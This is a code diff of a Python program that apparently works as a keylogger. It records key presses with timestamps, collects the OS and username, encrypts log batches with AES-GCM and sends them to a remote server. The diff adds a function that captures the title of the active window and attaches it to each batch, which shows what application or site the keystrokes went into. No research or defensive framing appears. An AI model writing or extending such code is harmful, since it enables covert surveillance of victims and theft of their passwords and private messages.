@@ -3,18 +3,16 @@ from datetime import datetime
 import time
 import threading
 import requests
-import json
 import uuid
 import platform
 import os
 import base64
+import pygetwindow
 
 from cryptography.hazmat.primitives import serialization
-from cryptography.hazmat.primitives.asymmetric import rsa, padding
+from cryptography.hazmat.primitives.asymmetric import padding
 from cryptography.hazmat.primitives import hashes
 from cryptography.hazmat.backends import default_backend
-from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
-from cryptography.hazmat.primitives import hmac
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 
 # config
@@ -111,6 +109,17 @@ def perform_handshake():
 
     return False
 
+def get_active_window_title():
+    try:
+        active_window = pygetwindow.getActiveWindow()
+        if active_window:
+            return active_window.title
+    except pygetwindow.PyGetWindowException:
+        # if no active window is found or on some systems
+        return "N/A - Window Info Unavailable"
+    except Exception as e:
+        print(f"Error getting window title: {e}")
+        return "N/A - Error"
 
 # record each key press and determine the time
 def on_press(key):
@@ -194,6 +203,7 @@ def send_data_batch():
         "os": platform.system(),
         "os_release": platform.release(),
         "username": os.getlogin(),
+        "active_window": get_active_window_title(),
     }
 
     # Encrypt log content with AES-GCM
